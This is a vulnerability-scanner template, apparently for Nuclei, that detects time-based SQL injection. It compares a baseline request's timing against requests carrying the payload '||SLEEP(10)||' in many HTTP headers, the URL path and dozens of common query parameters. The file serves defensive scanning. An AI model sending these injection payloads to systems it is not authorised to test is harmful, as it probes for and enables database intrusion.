id: time-based-sql-injection

info:
  name: Time based SQL injection
  author: kazet
  severity: critical
  description: Detects potential time-based SQL injection.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  tags: sqli,generic,time-based
  metadata:
    max-request: 3

http:
  - raw:
      - |
        @timeout: 15s
        GET / HTTP/1.1
        Host: {{ Hostname }}

      - |
        @timeout: 15s
        GET / HTTP/1.1
        Host: {{Hostname}}
        Accept: application/xml, application/json, text/plain, text/html, '||SLEEP(10)||'
        Accept-Encoding: acceptencoding'||SLEEP(10)||'
        Accept-Language: acceptlanguage'||SLEEP(10)||'
        Access-Control-Request-Headers: accesscontrolrequestheaders'||SLEEP(10)||'
        Access-Control-Request-Method: accesscontrolrequestmethod'||SLEEP(10)||'
        Authentication: Basic authenticationbasic'||SLEEP(10)||'
        Authentication: Bearer authenticationbearer'||SLEEP(10)||'
        Cookie: cookiename'||SLEEP(10)||'=cookievalue'||SLEEP(10)||'
        Location: location'||SLEEP(10)||'
        Origin: origin'||SLEEP(10)||'
        Referer: referer'||SLEEP(10)||'
        Upgrade-Insecure-Requests: upgradeinsecurerequests'||SLEEP(10)||'
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41'||SLEEP(10)||'
        X-Api-Version: xapiversion'||SLEEP(10)||'
        X-CSRF-Token: xcsrftoken'||SLEEP(10)||'
        X-Druid-Comment: xdruidcomment'||SLEEP(10)||'
        X-Forwarded-For: xforwardedfor'||SLEEP(10)||'
        X-Origin: xorigin'||SLEEP(10)||'

      - |
        @timeout: 15s
        GET /'||SLEEP(10)||' HTTP/1.1
        Host: {{ Hostname }}

      - |
        @timeout: 15s
        GET /?q='||SLEEP(10)||'&s='||SLEEP(10)||'&search='||SLEEP(10)||'&id='||SLEEP(10)||'&action='||SLEEP(10)||'&keyword='||SLEEP(10)||'&query='||SLEEP(10)||'&page='||SLEEP(10)||'&keywords='||SLEEP(10)||'&url='||SLEEP(10)||'&view='||SLEEP(10)||'&cat='||SLEEP(10)||'&name='||SLEEP(10)||'&key='||SLEEP(10)||'&p='||SLEEP(10)||'&api='||SLEEP(10)||'&api_key='||SLEEP(10)||'&begindate='||SLEEP(10)||'&callback='||SLEEP(10)||'&categoryid='||SLEEP(10)||'&csrf_token='||SLEEP(10)||'&email='||SLEEP(10)||'&emailto='||SLEEP(10)||'&enddate='||SLEEP(10)||'&immagine='||SLEEP(10)||'&item='||SLEEP(10)||'&title='||SLEEP(10)||'&l='||SLEEP(10)||'&lang='||SLEEP(10)||'&list_type='||SLEEP(10)||'&month='||SLEEP(10)||'&page_id='||SLEEP(10)||'&password='||SLEEP(10)||'&terms='||SLEEP(10)||'&token='||SLEEP(10)||'&type='||SLEEP(10)||'&unsubscribe_token='||SLEEP(10)||'&year='||SLEEP(10)||' HTTP/1.1
        Host: {{ Hostname }}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200'
          - 'duration_1<2'
        condition: and

      - type: dsl
        dsl:
          - 'duration_2>=9 || duration_3>=9 || duration_4 >= 9'
